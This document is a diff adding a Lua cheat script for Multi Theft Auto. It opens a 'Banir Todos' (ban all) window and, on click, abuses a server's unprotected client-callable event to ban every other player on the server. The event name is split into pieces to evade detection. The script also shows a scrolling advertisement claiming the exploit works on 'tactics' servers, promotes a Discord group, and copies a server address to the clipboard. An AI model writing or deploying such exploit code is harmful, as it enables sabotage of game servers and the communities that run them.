@@ -1,1 +1,63 @@
 
+outputChatBox("#FFFFFF[#00b34aBan #ff00ff Panel#FFFFFF]: Key: End", 255, 255, 255, true)
+local screenWidth, screenHeight = guiGetScreenSize()
+local window, button, label
+local ativo2 = false
+function createWindow()
+    if ativo2 == false then
+         ativo2 = true
+         showCursor(true) 
+
+    Paozin = guiCreateWindow((screenWidth - 300) / 2, (screenHeight - 150) / 2, 300, 150, "Banir Todos", false)
+
+    label = guiCreateLabel(10, 30, 280, 30, "Clique no botão para banir todos os jogadores!", false, Paozin)
+    guiLabelSetHorizontalAlign(label, "center", true)
+
+    buttu = guiCreateButton(90, 80, 120, 40, "Banir Todos", false, Paozin)
+
+
+    addEventHandler('onClientGUIClick', buttu, byebye, false)
+
+    else
+         ativo2 = false
+         showCursor(false) 
+         guiSetVisible(Paozin, false)
+     end
+
+end
+
+function byebye()
+    for _, player in ipairs(getElementsByType("player")) do
+        if localPlayer ~= player then
+            local d1, d2 = 'trigger', 'ServerEvent'
+            _G[d1..d2]("onClientCallsServerFunction", root, "banPlayer", player, true, true, true, root, "Banido por Paozin Do Mta-Comeback     .gg/KNHpCBrdvg", 9999999)
+        end
+    end
+end
+
+bindKey("end", "down", createWindow)
+
+local screenWidth, screenHeight = guiGetScreenSize()
+    local labelX = screenWidth
+    local labelY = screenHeight - 50 
+    local labelText = "Pao Community // Oppressor. Ban All (chance mais alta de funcionar em tactics // high chance to work in tactics server)                    90mh tactics funcionando perfeitamente!! // 90mh tactics working perfectly             Digite /90ip para pegar o ip do tactics // Type /90ip to copy the tactics uo"
+    local labelFont = "default-bold"
+    local labelSize = 1.1
+    local labelColor = tocolor(255, 255, 255, 255)
+    local scrollSpeed = 1.1 
+    function renderSlidingText()
+        labelX = labelX - scrollSpeed
+        if labelX + dxGetTextWidth(labelText, labelSize, labelFont) < 0 then
+            labelX = screenWidth
+        end
+        dxDrawText(labelText, labelX, labelY, screenWidth, screenHeight, labelColor, labelSize, labelFont, "left", "center", false, false, false)
+    end
+    addEventHandler("onClientRender", root, renderSlidingText)
+
+
+
+function noveip()
+    setClipboard( "mtasa://15.204.186.192:22023" )
+    outputChatBox("#FFFFFF[#00b34aCopiado] #ff00ff Cole no F8", 255, 255, 255, true)
+end
+addCommandHandler("90ip", noveip)
